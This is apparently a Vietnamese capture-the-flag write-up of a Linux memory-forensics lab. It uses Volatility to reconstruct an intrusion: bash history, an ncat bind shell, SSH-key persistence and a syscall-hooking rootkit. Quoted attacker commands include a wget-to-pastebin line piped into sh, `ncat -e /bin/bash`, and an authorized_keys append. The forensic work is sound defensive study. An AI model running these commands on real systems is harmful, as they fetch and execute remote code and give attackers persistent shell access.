# Seized Lab
## Bối cảnh 

Bài Lab cung cấp các bản chụp bộ nhớ (memory snapshot) của một máy chủ Linux CentOS bị nghi ngờ đã bị tấn công. Nhiệm vụ của mình là đóng vai chuyên gia blue team: dùng Volatility cùng profile CentOS 7 (kernel 3.10.0-1062) đi kèm để phân tích memory, từ đó xác định chi tiết cuộc tấn công, gồm thông tin hệ thống, tiến trình, kết nối mạng và các hành vi của kẻ tấn công.

## Q1: What is the CentOS version installed on the machine?

- Đề cung cấp profile `Centos7.3.10.1062`, tên profile cho biết hệ điều hành là CentOS 7 với kernel `3.10.0-1062`.

<img width="411" height="73" alt="image" src="https://github.com/user-attachments/assets/19c83de1-1e4a-499c-9d31-24617aab31fb" />

- Mình đối chiếu số kernel này với bảng phiên bản CentOS thì thấy kernel 3.10.0-1062 thuộc bản CentOS 7.7.1908 (phát hành tháng 8/2019, dựa trên RHEL 7.7)

- Để xác nhận, mình tìm chuỗi `CentOS Linux release` trong memory dump bằng `strings` và `grep` và kết quả chính xác là CentOS 7.7.1908

<img width="937" height="126" alt="image" src="https://github.com/user-attachments/assets/4f671e9c-5279-44bc-b1e9-5a1cb0822de5" />


## Q2: There is a command containing a strange message in the bash history. Will you be able to read it?

- Ở câu này mình dùng plugin `linux_bash` của Volatility 2 với profile CentOS 7 (kernel 3.10.0-1062): `vol2 -f dump.mem --profile=LinuxCentOS7_3_10_1062x64 linux_bash`.
- Trong lịch sử lệnh của tiến trình bash PID 2622, mình thấy lệnh `echo "c2hrQ1RG..." > y0ush0uldr34dth1s.txt`. Chuỗi trong lệnh có dạng base64 (kết thúc bằng `=`), còn tên file đích đọc là "you should read this".

<img width="797" height="485" alt="image" src="https://github.com/user-attachments/assets/50dd4ecb-4506-40da-b619-3bb22b0943e2" />

- Sau khi giải mã chuỗi base64 thì mình nhận được flag là `shkCTF{l3ts_st4rt_th3_1nv3st_75cc55476f3dfe1629ac60}`


<img width="1547" height="583" alt="image" src="https://github.com/user-attachments/assets/d154b368-2270-4f08-9fb7-49c0e3ae7312" />

**Đáp án:** `shkCTF{l3ts_st4rt_th3_1nv3st_75cc55476f3dfe1629ac60}`


## Q3: What is the PID of the suspicious process?

- Ở câu này mình dùng plugin `linux_pstree` để xem cây tiến trình: `vol2 -f dump.mem --profile=LinuxCentOS7_3_10_1062x64 linux_pstree`.
- Ngay sau đó mình phát hiện ra một tiến trình `ncat` rất đáng ngờ dùng để mở shell từ xa có PID là `2854`

<img width="507" height="241" alt="image" src="https://github.com/user-attachments/assets/854b74ad-76aa-442b-b7ae-4ff7be3a7a75" />

**Đáp án:** `2854`

## Q4: The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?

- Mình dùng lại kết quả `linux_bash` ở câu 2 và chú ý lệnh `git clone https://github.com/tw0phi/PythonBackup`. Mình truy cập repo này và thấy file `snapshot.py` chứa dòng `os.system('wget -O - https://pastebin.com/raw/nQwMKjtZ 2>/dev/null|sh')`, tức là tải nội dung từ pastebin rồi thực thi trực tiếp bằng `sh`.

<img width="1912" height="576" alt="image" src="https://github.com/user-attachments/assets/bcb9a590-3d3b-4bd5-be12-b6fbc75239ca" />

- Mình mở link pastebin và thấy hai dòng: một dòng comment `### Congratz :` kèm chuỗi base64, và dòng lệnh `nohup ncat -lvp 12345 -4 -e /bin/bash > /dev/null 2>/dev/null &`. Dòng lệnh này mở một bind shell bằng ncat ở cổng 12345 chạy nền, đây chính là backdoor.

- Mình giải mã chuỗi base64 bằng `base64 -d` và thu được thông điệp ẩn:`shkCTF{th4t_w4s_4_dumb_b4ckd00r_86033c19e3f39315c00dca}`

## Q5: What are the attacker's IP address and the local port on the targeted machine?

- Backdoor ở câu 4 mở bind shell bằng `ncat -lvp 12345`, nên mình dùng plugin `linux_netstat` để xem kết nối mạng của tiến trình `.ncat`: `vol2 -f dump.mem --profile=LinuxCentOS7_3_10_1062x64 linux_netstat | grep "2854"`.

- Kết quả cho thấy một kết nối `ESTABLISHED` giữa máy nạn nhân ở cổng `12345 ` và địa chỉ IP của kẻ tấn công là `192.168.49.1`

<img width="905" height="90" alt="image" src="https://github.com/user-attachments/assets/c520acbb-1bfe-412d-9a8d-f8aed228b987" />


**Đáp án:** `192.168.49.1:12345`

## Q6: What is the first command that the attacker executed?

- Mình dùng plugin `linux_psaux` để liệt kê dòng lệnh của các tiến trình: `vol2 -f dump.mem --profile=LinuxCentOS7_3_10_1062x64 linux_psaux`.
- Kết quả cho thấy chuỗi tiến trình chạy bằng root: `ncat -lvp 12345 -4 -e /bin/bash` (PID 2854), tiếp theo là `/bin/bash` (PID 2876) do ncat sinh ra khi kẻ tấn công kết nối, sau đó là tiến trình PID 2886 chạy `python -c import pty; pty.spawn("/bin/bash")`.

<img width="831" height="403" alt="image" src="https://github.com/user-attachments/assets/ba6595e4-4c1a-4c09-b391-46e1d266e4ad" />

**Đáp án:** `python -c 'import pty; pty.spawn("/bin/bash")'`

## Q7: After changing the user password, we found that the attacker still has access. Can you find out how?

- Từ lịch sử bash ở câu 2, mình chú ý tiến trình PID 2887 chạy `vim /etc/rc.local`, sau đó mình dùng plugin linux_dump_map để dump bộ nhớ của nó: `vol2 -f dump.mem --profile=LinuxCentOS7_3_10_1062x64 linux_dump_map --pid 2887 -D 2887/`.

- Tiếp tục mình trích chuỗi bằng `strings -a 2887/* > 2887/strings.txt`, đọc kết quả và thấy lệnh `echo "ssh-rsa AAAAB3... tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys` cùng chuỗi base64 `c2hrQ1RG...` nằm gần đó.

<img width="1681" height="115" alt="image" src="https://github.com/user-attachments/assets/579cfc7e-e3b4-46a8-a362-07954587b286" />

- Sau đó mình giải mã chuỗi base64 ấy thì thu được flag là `shkCTF{rc.l0c4l_1s_funny_be2472cfaeed467ec9cab5b5a38e5fa0}`

<img width="1541" height="545" alt="image" src="https://github.com/user-attachments/assets/2a3dedd5-4810-4b54-bd28-2486f43b7065" />

## Q8: What is the name of the rootkit that the attacker used?

- Mình dùng plugin `linux_check_syscall` của Volatility 2: `vol2 -f dump.mem --profile=LinuxCentOS7_3_10_1062x64 linux_check_syscall | grep -i HOOKED` để tìm ra những rootkit hook bảng syscall của kernel.
- Kết quả có hai dòng. Dòng syscall số 88 bị hook trỏ tới hàm `syscall_callback` trong module **sysemptyrect**. Dòng syscall số 332 có địa chỉ `0x6461625f6e726177` thực chất là chuỗi ASCII `warn_bad`.

<img width="827" height="151" alt="image" src="https://github.com/user-attachments/assets/d540b364-3918-45e3-93a3-4413c71f6daa" />

**Đáp án:** `sysemptyrect`

## Q9: The rootkit uses crc65 encryption. What is the key?


